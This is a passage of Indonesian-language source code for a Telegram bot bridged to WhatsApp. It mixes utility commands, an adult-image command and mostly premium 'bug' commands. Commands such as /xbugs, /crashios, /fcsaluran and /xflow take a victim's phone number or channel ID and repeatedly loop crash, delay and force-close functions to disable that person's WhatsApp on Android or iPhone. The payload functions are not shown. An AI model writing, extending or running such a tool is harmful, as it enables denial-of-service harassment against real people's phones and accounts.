    try { await ctx.deleteMessage(wait.message_id); } catch {}
  }
});

bot.command('cekidch', async (ctx) => {
  const args = ctx.message.text.split(" ");
  
  // Cek input
  if (args.length < 2) return ctx.reply("❌ Format salah! /cekidch <link_channel>");
  
  const link = args[1];

  // Validasi link channel WA
  if (!link.includes("https://whatsapp.com/channel/")) {
    return ctx.reply("❌ Link channel tidak valid!");
  }

  try {
    // Ambil kode undangan dari link
    const inviteCode = link.split("https://whatsapp.com/channel/")[1];

    // Ambil metadata channel WA via Baileys
    const res = await zenxy.newsletterMetadata("invite", inviteCode);

    // Format teks hasil
    const teks = `
📡 *Data Channel WhatsApp*
━━━━━━━━━━━━━━━━━━
🆔 *ID:* ${res.id}
📛 *Nama:* ${res.name}
👥 *Total Pengikut:* ${res.subscribers}
📊 *Status:* ${res.state}
✅ *Verified:* ${res.verification === "VERIFIED" ? "Terverifikasi" : "Belum Verif"}
`;

    // Kirim balasan ke Telegram
    await ctx.reply(teks, { parse_mode: "Markdown" });

  } catch (err) {
    console.error(err);
    ctx.reply("❌ Gagal mengambil data channel. Pastikan link benar dan WA bot online.");
  }
});

bot.command('mediafire', async (ctx) => {
    const args = ctx.message.text.split(' ').slice(1);
    if (!args.length) return ctx.reply('Gunakan: /mediafire <url>');

    try {
      const { data } = await axios.get(`https://www.velyn.biz.id/api/downloader/mediafire?url=${encodeURIComponent(args[0])}`);
      const { title, url } = data.data;

      const filePath = `/tmp/${title}`;
      const response = await axios.get(url, { responseType: 'arraybuffer' });
      fs.writeFileSync(filePath, response.data);

      const zip = new AdmZip();
      zip.addLocalFile(filePath);
      const zipPath = filePath + '.zip';
      zip.writeZip(zipPath);

      await ctx.replyWithDocument({ source: zipPath }, {
        filename: path.basename(zipPath),
        caption: '📦 File berhasil di-zip dari MediaFire'
      });

      
      fs.unlinkSync(filePath);
      fs.unlinkSync(zipPath);

    } catch (err) {
      console.error('[MEDIAFIRE ERROR]', err);
      ctx.reply('Terjadi kesalahan saat membuat ZIP.');
    }
  });
  
bot.command("catbox", checkPremium, async (ctx) => {
  const r = ctx.message.reply_to_message;
  if (!r) return ctx.reply("🪧 ☇ Format: /catbox ( reply dengan foto/video )");

  let fileId = null;
  if (r.video && r.video.length) {
    fileId = r.video[r.video.length - 1].file_id;
  } else if (r.video) {
    fileId = r.video.file_id;
  } else if (r.video_note) {
    fileId = r.video_note.file_id;
  } else {
    return ctx.reply("❌ ☇ Hanya mendukung foto atau video");
  }

  const wait = await ctx.reply("⏳ ☇ Mengambil file & mengunggah ke catbox");

  try {
    const tgLink = String(await ctx.telegram.getFileLink(fileId));

    const params = new URLSearchParams();
    params.append("reqtype", "urlupload");
    params.append("url", tgLink);

    const { data } = await axios.post("https://catbox.moe/user/api.php", params, {
      headers: { "content-type": "application/x-www-form-urlencoded" },
      timeout: 30000
    });

    if (typeof data === "string" && /^https?:\/\/files\.catbox\.moe\//i.test(data.trim())) {
      await ctx.reply(data.trim());
    } else {
      await ctx.reply("❌ ☇ Gagal upload ke catbox" + String(data).slice(0, 200));
    }
  } catch (e) {
    const msg = e?.response?.status
      ? `❌ ☇ Error ${e.response.status} saat unggah ke catbox`
      : "❌ ☇ Gagal unggah coba lagi.";
    await ctx.reply(msg);
  } finally {
    try { await ctx.deleteMessage(wait.message_id); } catch {}
  }
});

bot.command('iqc', async (ctx) => {
  try {
    const args = ctx.message.text.split(' ').slice(1);
    if (args.length < 3) {
      return ctx.reply('Gunakan format:\n/iqc <pesan> <baterai> <operator>\n\nContoh:\n/iphone Halo dunia 87 Telkomsel');
    }

    // Gabung argumen, misalnya: [ 'Halo', 'dunia', '87', 'Telkomsel' ]
    const battery = args[args.length - 2];       // misal 87
    const carrier = args[args.length - 1];       // misal Telkomsel
    const text = args.slice(0, -2).join(' ');    // sisanya jadi pesan
    const time = new Date().toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit' });

    await ctx.reply('⏳ Membuat quoted message gaya iPhone...');

    // 🔗 Build API URL
    const apiUrl = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(time)}&messageText=${encodeURIComponent(text)}&carrierName=${encodeURIComponent(carrier)}&batteryPercentage=${encodeURIComponent(battery)}&signalStrength=4&emojiStyle=apple`;

    // Ambil hasil gambar dari API
    const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
    const buffer = Buffer.from(response.data, 'binary');

    // Kirim gambar hasil API ke user
    await ctx.replyWithPhoto({ source: buffer }, { caption: `📱 iPhone quote dibuat!\n🕒 ${time}` });
  } catch (err) {
    console.error('❌ Error case /iqc:', err);
    await ctx.reply('Terjadi kesalahan saat memproses gambar.');
  }
});

bot.command('gpt4o', async (ctx) => {
    const text = ctx.message.text.split(' ').slice(1).join(' ');
    if (!text) return ctx.reply('Penggunaan: /gpt4o <teks>');

    try {
      const res = await fetch(`https://fastrestapis.fasturl.cloud/aillm/gpt-4o-turbo?ask=${encodeURIComponent(text)}`);
      const json = await res.json();

      if (!json || !json.result) {
        return ctx.reply('Gagal mendapatkan balasan dari AI.');
      }

      const replyText = `*B O C C H I   -   M D*\n\n\`\`\`\n${json.result}\n\`\`\``;

      await ctx.reply(replyText, { parse_mode: 'Markdown' });
    } catch (err) {
      console.error(err);
      ctx.reply('Terjadi kesalahan saat memproses permintaan.');
    }
  });

//Tools 18+
bot.command('videobkp', async (ctx) => {
  // Kirim pesan loading
  const loadingMsg = await ctx.reply('🔄 Loading video... Tunggu sebentar!');
  
  const getRandomVideo = () => videoList[Math.floor(Math.random() * videoList.length)];
  const pick = getRandomVideo();
  
  try {
    // Gunakan approach direct URL tanpa download
    await ctx.replyWithVideo(pick.url, {  // Langsung pass URL string, bukan object
      caption: '🎬 Video special untuk kamu!',
      reply_markup: {
        inline_keyboard: [[{ text: '➡️ Next Video', callback_data: 'video_next' }]]
      }
    });
    
    // Hapus pesan loading
    await ctx.deleteMessage(loadingMsg.message_id);
    
  } catch (err) {
    console.error('[VIDEO ERROR]', err.message);
    await ctx.editMessageText('❌ Gagal mengirim video. Coba lagi nanti.', {
      chat_id: ctx.chat.id,
      message_id: loadingMsg.message_id
    });
  }
});

bot.action('video_next', async (ctx) => {
  const getRandomVideo = () => videoList[Math.floor(Math.random() * videoList.length)];
  
  try {
    await ctx.answerCbQuery();
    
    // Kirim loading untuk next
    const loadingMsg = await ctx.reply('🔄 Loading video berikutnya...');
    
    await ctx.deleteMessage(); // Delete message lama
    
    const pick = getRandomVideo();
    await ctx.replyWithVideo(pick.url, {  // Direct URL
      caption: '🎬 Video berikutnya!',
      reply_markup: {
        inline_keyboard: [[{ text: '➡️ Next Video', callback_data: 'video_next' }]]
      }
    });
    
    await ctx.deleteMessage(loadingMsg.message_id);
    
  } catch (err) {
    console.error('[VIDEO NEXT ERROR]', err.message);
    await ctx.answerCbQuery('❌ Error loading video', { show_alert: true });
  }
});

const listHentai = [
  {"url": "https://files.catbox.moe/5wt81f.jpg"},
  {"url": "https://files.catbox.moe/xdqj22.jpg"},
  {"url": "https://files.catbox.moe/lvafhj.jpg"},
  {"url": "https://files.catbox.moe/em6j1f.jpg"},
  {"url": "https://files.catbox.moe/5bgyld.jpg"},
  {"url": "https://files.catbox.moe/orafro.jpg"},
  {"url": "https://files.catbox.moe/lcm9x3.jpg"},
  {"url": "https://files.catbox.moe/x3ux77.jpg"},
  {"url": "https://files.catbox.moe/f5ucmj.jpg"},
  {"url": "https://files.catbox.moe/djq46h.jpg"},
  {"url": "https://files.catbox.moe/0bf9b5.jpg"},
  {"url": "https://files.catbox.moe/0bf9b5.jpg"},
  {"url": "https://files.catbox.moe/w0225y.jpg"},
  {"url": "https://files.catbox.moe/fqm5fg.jpg"},
  {"url": "https://files.catbox.moe/itv3b0.jpg"},
  {"url": "https://files.catbox.moe/s45bdq.jpg"},
  {"url": "https://files.catbox.moe/omhwvo.jpg"},
  {"url": "https://files.catbox.moe/8eaqrj.jpg"},
  {"url": "https://files.catbox.moe/fstacw.jpg"},
  {"url": "https://files.catbox.moe/fstacw.jpg"},
  {"url": "https://files.catbox.moe/e99emf.jpg"}
]

bot.command('hentai', async (ctx) => {
  const loadingMsg = await ctx.reply('🔄 Loading hentai...');
  
  const getRandom = () => listHentai[Math.floor(Math.random() * listHentai.length)];
  const pick = getRandom();
  
  try {
    await ctx.replyWithPhoto(pick.url, {
      caption: 'Hentai untuk anda🤤',
      reply_markup: {
        inline_keyboard: [[{ text: '➡️ Next Hentai', callback_data: 'hentai_next' }]]
      }
    });
    
    await ctx.deleteMessage(loadingMsg.message_id);
  } catch (err) {
    console.error('[HENTAI ERROR]', err.message);
    await ctx.editMessageText('❌ Gagal mengirim hentai. Coba lagi nanti.', {
      chat_id: ctx.chat.id,
      message_id: loadingMsg.message_id
    });
  }
});

bot.action('hentai_next', async (ctx) => {
  const getRandom = () => listHentai[Math.floor(Math.random() * listHentai.length)];
  
  try {
    await ctx.answerCbQuery();
    
    const loadingMsg = await ctx.reply('🔄 Loading hentai berikutnya...');
    await ctx.deleteMessage();
    
    const pick = getRandom();
    await ctx.replyWithPhoto(pick.url, {
      caption: 'Hentai selanjutnya untuk anda🤤',
      reply_markup: {
        inline_keyboard: [[{ text: '➡️ Next Hentai', callback_data: 'hentai_next' }]]
      }
    });
    
    await ctx.deleteMessage(loadingMsg.message_id);
  } catch (err) {
    console.error('[HENTAI NEXT ERROR]', err.message);
    await ctx.answerCbQuery('❌ Error loading hentai', { show_alert: true });
  }
});

bot.command("anime", async (ctx) => {
  try { const { data } = await axios.get("https://api.waifu.pics/sfw/waifu"); await ctx.replyWithPhoto(data.url); }
  catch { ctx.reply("❌ Gagal mengambil gambar anime"); }
});
bot.command("waifu", async (ctx) => {
  try { const { data } = await axios.get("https://api.waifu.pics/sfw/waifu"); await ctx.replyWithPhoto(data.url,{caption:"🌸 Waifu (SFW)"}); }
  catch { ctx.reply("❌ Gagal mengambil waifu"); }
});

bot.command("animbrat", async (ctx) => {
    const args = ctx.message.text.split(" ").slice(1).join(" ");
    if (!args) {
      return ctx.reply(`❌ Masukkan teks untuk gambar!\n\nContoh:\n/animbrat Halo, aku user lucu | center | image`);
    }

    // Parsing format: /animbrat teks | posisi | mode
    const [text, position, mode] = args.split("|").map(v => v?.trim());

    if (!text) {
      return ctx.reply("❌ Teks tidak boleh kosong.");
    }

    try {
      const res = await axios.get("https://fastrestapis.fasturl.cloud/maker/animbrat", {
        responseType: "arraybuffer",
        params: {
          text,
          position: position || "center",
          mode: mode || "image"
        },
        headers: {
          accept: "image/png"
          // 'x-api-key': 'APIKEY' // opsional
        }
      });

      const buffer = Buffer.from(res.data, "binary");

      const fileType = (mode || "image").toLowerCase() === "animated" ? "video" : "video";
      const caption = `🎭 Anime Brat\n📝 Teks: ${text}\n📍 Posisi: ${position || "center"}\n🎞️ Mode: ${mode || "image"}`;

      if (fileType === "video") {
        await ctx.sendVideo({ source: buffer }, { caption });
      } else {
        await ctx.replyWithAnimation({ source: buffer }, { caption });
      }
    } catch (err) {
      console.error(err?.response?.data || err.message);
      ctx.reply("❌ Gagal membuat gambar Anime Brat. Pastikan format benar atau coba lagi nanti.");
    }
  });

//Tamat

bot.command("xbugs", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /xbugs 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, vidthumbnail, {
    caption: `
<blockquote><pre>⬡═―—⊱ ⎧ DREAM CORE ⎭ ⊰―—═⬡</pre></blockquote>
ﾒ.- Target: ${q}
ﾒ.- Type: Delay Hard
ﾒ.- Status: Process`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜ ﾒ ⌟ ☇ 𝐂𝐇𝐀𝐓 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 100; i++) {
    await SixbBlank(sock, target);
    await sleep(400);
    await VtxBlankAndroVersi1(sock, target);
    await sleep(1000);
    await DelayNgawi(sock, target);
    await sleep(500);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>⬡═―—⊱ ⎧ DREAM CORE ⎭ ⊰―—═⬡</pre></blockquote>
ﾒ.- Target: ${q}
ﾒ.- Type: Delay Hard 
ﾒ.- Status: Success`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜ ﾒ ⌟ ☇ 𝐂𝐇𝐀𝐓 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("xkill", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /xkill 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, vidthumbnail, {
    caption: `
<blockquote><pre>⬡═―—⊱ ⎧ DREAM CORE ⎭ ⊰―—═⬡</pre></blockquote>
ﾒ.- Target: ${q}
ﾒ.- Type: Delay X Bludo 
ﾒ.- Status: Process`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜ ﾒ ⌟ ☇ 𝐂𝐇𝐀𝐓 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 120; i++) {
    await SixbBlank(sock, target);
    await sleep(400);
    await YxGInfoNe(target);
    await sleep(1000);
    await YxGInfoNe(target);
    await sleep(1500);
    DelayNgawi(sock, target);
    await sleep(500);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>⬡═―—⊱ ⎧ DREAM CORE ⎭ ⊰―—═⬡</pre></blockquote>
ﾒ.- Target: ${q}
ﾒ.- Type: Delay X Bludo 
ﾒ.- Status: Success`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜ ﾒ ⌟ ☇ 𝐂𝐇𝐀𝐓 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("xynerx", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /xynerx 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, vidthumbnail, {
    caption: `
<blockquote><pre>⬡═―—⊱ ⎧ DREAM CORE ⎭ ⊰―—═⬡</pre></blockquote>
ﾒ.- Target: ${q}
ﾒ.- Type: Forclose Andro
ﾒ.- Status: Process`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜ ﾒ ⌟ ☇ 𝐂𝐇𝐀𝐓 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 51; i++) {
    await KartuPy(sock, target);
    await sleep(400);
    await KartuPy(sock, target);
    await sleep(1000);
    await DelayNgawi(sock, target);
    await sleep(500);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>⬡═―—⊱ ⎧ DREAM CORE ⎭ ⊰―—═⬡</pre></blockquote>
ﾒ.- Target: ${q}
ﾒ.- Type: Forclose Andro
ﾒ.- Status: Success`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜ ﾒ ⌟ ☇ 𝐂𝐇𝐀𝐓 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("zypherx", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /zypherx 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, vidthumbnail, {
    caption: `
<blockquote><pre>⬡═―—⊱ ⎧ DREAM CORE ⎭ ⊰―—═⬡</pre></blockquote>
ﾒ.- Target: ${q}
ﾒ.- Type: Delay Hard V2 
ﾒ.- Status: Process`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜ ﾒ ⌟ ☇ 𝐂𝐇𝐀𝐓 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 130; i++) {
    await callCrash(sock, target, isVideo = false);
    await sleep(400);
    await callCrash(sock, target, isVideo = false);
    await sleep(1000);
    await DelayNgawi(sock, target);
    await sleep(500);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>⬡═―—⊱ ⎧ DREAM CORE ⎭ ⊰―—═⬡</pre></blockquote>
ﾒ.- Target: ${q}
ﾒ.- Type: Delay Hard V2 
ﾒ.- Status: Success`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜ ﾒ ⌟ ☇ 𝐂𝐇𝐀𝐓 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("fcsaluran", checkWhatsAppConnection, checkPremium, checkCooldown, async ctx => {
    
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply(
      `❌ Syntax Error!\n\nUse : /fcsaluran <id channel>\nExample : /fcsaluran 120363×××\n\n© 𖣂-Dark. ẽscãnnõr. ϟ`
    );

    let target = q.replace(/[^0-9]/g, '') + "@newsletter";

    const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, vidthumbnail, {
    caption: `
<blockquote><pre>⬡═―—⊱ ⎧ DREAM CORE ⎭ ⊰―—═⬡</pre></blockquote>
ﾒ.- Target: ${q}
ﾒ.- Type: Forclose Saluran
ﾒ.- Status: Process`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜ ﾒ ⌟ ☇ 𝐂𝐇𝐀𝐓 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${target}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 150; i++) {
    await FcCh(target);
    await sleep(400);
    await FcCh(target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>⬡═―—⊱ ⎧ DREAM CORE ⎭ ⊰―—═⬡</pre></blockquote>
ﾒ.- Target: ${q}
ﾒ.- Type: Forclose Saluran
ﾒ.- Status: Success`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜ ﾒ ⌟ ☇ 𝐂𝐇𝐀𝐓 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${target}` }
      ]]
    }
  });
});

    
bot.command("xflow", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /xflow 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, vidthumbnail, {
    caption: `
<blockquote><pre>⬡═―—⊱ ⎧ DREAM CORE ⎭ ⊰―—═⬡</pre></blockquote>
ﾒ.- Target: ${q}
ﾒ.- Type: Invisible Forclose Iphone
ﾒ.- Status: Process`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜ ﾒ ⌟ ☇ 𝐂𝐇𝐀𝐓 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 100; i++) {
    await KartuPy(sock, target);
    await sleep(400);
    await KartuPy(sock, target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>⬡═―—⊱ ⎧ DREAM CORE ⎭ ⊰―—═⬡</pre></blockquote>
ﾒ.- Target: ${q}
ﾒ.- Type: Invisible Forclose Iphone
ﾒ.- Status: Success`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜ ﾒ ⌟ ☇ 𝐂𝐇𝐀𝐓 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("xenon", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /xenon 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, vidthumbnail, {
    caption: `
<blockquote><pre>⬡═―—⊱ ⎧ DREAM CORE ⎭ ⊰―—═⬡</pre></blockquote>
ﾒ.- Target: ${q}
ﾒ.- Type: Forclose iPhone Anti ban
ﾒ.- Status: Process`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜ ﾒ ⌟ ☇ 𝐂𝐇𝐀𝐓 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 100; i++) {
    await SixbBlank(sock, target);
    await sleep(400);
    await Yrp(target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>⬡═―—⊱ ⎧ DREAM CORE ⎭ ⊰―—═⬡</pre></blockquote>
ﾒ.- Target: ${q}
ﾒ.- Type: Forclose iPhone Anti ban
ﾒ.- Status: Success`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜ ﾒ ⌟ ☇ 𝐂𝐇𝐀𝐓 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("xblank", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /xblank 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, vidthumbnail, {
    caption: `
<blockquote><pre>⬡═―—⊱ ⎧ DREAM CORE ⎭ ⊰―—═⬡</pre></blockquote>
ﾒ.- Target: ${q}
ﾒ.- Type: BlankUi/StukLogo
ﾒ.- Status: Process`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜ ﾒ ⌟ ☇ 𝐂𝐇𝐀𝐓 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 120; i++) {
    await SixbBlank(sock, target);
    await sleep(400);
    await Yrp(target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>⬡═―—⊱ ⎧ DREAM CORE ⎭ ⊰―—═⬡</pre></blockquote>
ﾒ.- Target: ${q}
ﾒ.- Type: BlankUi/StukLogo
ﾒ.- Status: Success`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜ ﾒ ⌟ ☇ 𝐂𝐇𝐀𝐓 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("spmdelayinv", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /spmdelayinv 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, vidthumbnail, {
    caption: `
<blockquote><pre>⬡═―—⊱ ⎧ DREAM CORE ⎭ ⊰―—═⬡</pre></blockquote>
ﾒ.- Target: ${q}
ﾒ.- Type: Spam Delay InvisHard
ﾒ.- Status: Process`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜ ﾒ ⌟ ☇ 𝐂𝐇𝐀𝐓 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 20; i++) {
    await OtaxAyunBelovedX(sock, target, true);
    await sleep(400);
    await delayhard2025(sock, target, true);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>⬡═―—⊱ ⎧ DREAM CORE ⎭ ⊰―—═⬡</pre></blockquote>
ﾒ.- Target: ${q}
ﾒ.- Type: Spam Delay InvisHard
ﾒ.- Status: Success`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜ ﾒ ⌟ ☇ 𝐂𝐇𝐀𝐓 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("delaytif", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /delaytif 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, vidthumbnail, {
    caption: `
<blockquote><pre>⬡═―—⊱ ⎧ DREAM CORE ⎭ ⊰―—═⬡</pre></blockquote>
ﾒ.- Target: ${q}
ﾒ.- Type: Delay Notif
ﾒ.- Status: Process`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜ ﾒ ⌟ ☇ 𝐂𝐇𝐀𝐓 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 130; i++) {
    await Abimzubreg(target);
    await sleep(400);
    await R8Abim(target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>⬡═―—⊱ ⎧ DREAM CORE ⎭ ⊰―—═⬡</pre></blockquote>
ﾒ.- Target: ${q}
ﾒ.- Type: Delay Notif
ﾒ.- Status: Success`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜ ﾒ ⌟ ☇ 𝐂𝐇𝐀𝐓 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("crashios", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /crashios 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, vidthumbnail, {
    caption: `
<blockquote><pre>⬡═―—⊱ ⎧ DREAM CORE ⎭ ⊰―—═⬡</pre></blockquote>
ﾒ.- Target: ${q}
ﾒ.- Type: Crash Ios
ﾒ.- Status: Process`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜ ﾒ ⌟ ☇ 𝐂𝐇𝐀𝐓 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 51; i++) {
    await xndIOS(target);
    await sleep(400);
    await xndIOS(target);
    await sleep(1000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>⬡═―—⊱ ⎧ DREAM CORE ⎭ ⊰―—═⬡</pre></blockquote>
ﾒ.- Target: ${q}
ﾒ.- Type: Crash Ios
ﾒ.- Status: Success`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜ ﾒ ⌟ ☇ 𝐂𝐇𝐀𝐓 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("blankios", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /blankios 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, vidthumbnail, {
    caption: `
<blockquote><pre>⬡═―—⊱ ⎧ DREAM CORE ⎭ ⊰―—═⬡</pre></blockquote>
ﾒ.- Target: ${q}
ﾒ.- Type: Blank Clik Ios
ﾒ.- Status: Process`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜ ﾒ ⌟ ☇ 𝐂𝐇𝐀𝐓 𝐓𝐀𝐑𝐆𝐄𝐓", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 51; i++) {
    await xndIOS(target);
    await sleep(400);
    await xndIOS(target);
    await sleep(1000);
  }

